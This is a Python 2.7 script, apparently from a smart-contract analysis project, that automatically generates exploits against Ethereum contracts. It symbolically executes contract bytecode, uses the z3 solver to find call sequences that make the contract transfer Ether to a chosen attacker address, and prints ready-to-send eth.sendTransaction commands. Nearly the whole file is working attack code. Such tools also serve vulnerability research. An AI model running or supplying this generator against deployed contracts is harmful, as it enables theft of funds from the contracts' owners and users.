#!/usr/bin/env python2.7
import itertools
import logging
import sys
from binascii import unhexlify, hexlify

from z3 import z3

from ethanalyze.constraints import model_to_calls, check_model_and_resolve
from ethanalyze.evm import concrete, CombinedSymbolicResult, IntractablePath
from ethanalyze.project import Project

logging.basicConfig(level=logging.DEBUG)


class Nope(Exception):
    pass


def attempt_exploit(r, target_addr, target_amount, amount_check='+'):
    addr = z3.simplify(r.state.stack[-2])
    amount = z3.simplify(r.state.stack[-3])

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == target_addr)
    else:
        if addr != target_addr:
            raise Nope

    if not concrete(amount):
        if amount_check == '+':
            extra_constraints.append(z3.UGE(amount,target_amount))
        elif amount_check == '-':
            extra_constraints.append(z3.ULE(amount,target_amount))
        else:
            extra_constraints.append(amount == target_amount)

    try:
        logging.info('combined path contraints:')
        for i, c in enumerate(r.constraints + extra_constraints):
           logging.info('C%d: %s', i, z3.simplify(c))
        for i,(h,v) in enumerate(r.sha_constraints.iteritems()):
            logging.info('Hash %d: %s = KECCAK(%s)', i, h, v)
        model = check_model_and_resolve(r.constraints + extra_constraints, r.sha_constraints)
        return model_to_calls(model), r, model
    except IntractablePath as e:
        logging.exception('Intractable Path/Constraints')
        raise Nope


def combined_call_exploit(code, target_addr, target_amount, amount_check='+', max_calls=3):
    p = Project(code)
    call_ins = p.cfg.filter_ins('CALL')
    if not call_ins:
        logging.info('No CALL instructions')
        return
    logging.info('Found %d CALL instructions', len(call_ins))
    end_ins = p.filter_ins('RETURN') + p.filter_ins('STOP')
    if not end_ins:
        logging.info('No RETURN or STOP instructions')
        return
    logging.info('Found %d RETURN and STOP instructions', len(end_ins))
    all_calls = []
    for call, call_path, call_r in p.get_constraints(call_ins, [1, 2]):
        all_calls.append(call_r)
        combined = CombinedSymbolicResult()
        combined.prepend(call_r)
        combined.simplify()
        try:
            return attempt_exploit(combined, target_addr, target_amount, amount_check)
        except Nope:
            continue

    all_ends = []
    for end, end_path, end_r in p.get_constraints(end_ins):
        all_ends.append(end_r)
        for call_r in all_calls:
            combined = CombinedSymbolicResult()
            combined.prepend(call_r)
            combined.prepend(end_r)
            combined.simplify()
            try:
                return attempt_exploit(combined, target_addr, target_amount, amount_check)
            except Nope:
                continue

    calls = [all_calls, all_ends]
    while len(calls) < max_calls:
        calls.append(all_ends)
        for combo in itertools.product(*calls):
            combined = CombinedSymbolicResult()
            logging.debug('Combo: %s', ', '.join('%x'%r.state.pc for r in combo[::-1]))
            for r in combo:
                combined.prepend(r)
            combined.simplify()
            try:
                return attempt_exploit(combined, target_addr, target_amount, amount_check)
            except Nope:
                continue

    logging.info('Could not exploit any RETURN+CALL')
    return


def main():
    if len(sys.argv) < 4:
        print 'Usage: %s <code> <target-address> <amount>' % sys.argv[0]
        exit(-1)
    with open(sys.argv[1]) as infile:
        inbuffer = infile.read().rstrip()
    amount_check = '='
    amount = sys.argv[3].strip()
    if amount[0] in ('=', '+', '-'):
        amount_check = amount[0]
        amount = amount[1:]
    amount = int(amount)
    code = unhexlify(inbuffer)
    result = combined_call_exploit(code, int(sys.argv[2], 16), amount, amount_check)
    if result:
        call, r, model = result
        print call
        print
        for c in call:
            print 'eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x4000000000000000000000000000000000000000"})' % (
                int(sys.argv[2], 16), hexlify(c['payload']))


if __name__ == '__main__':
    main()
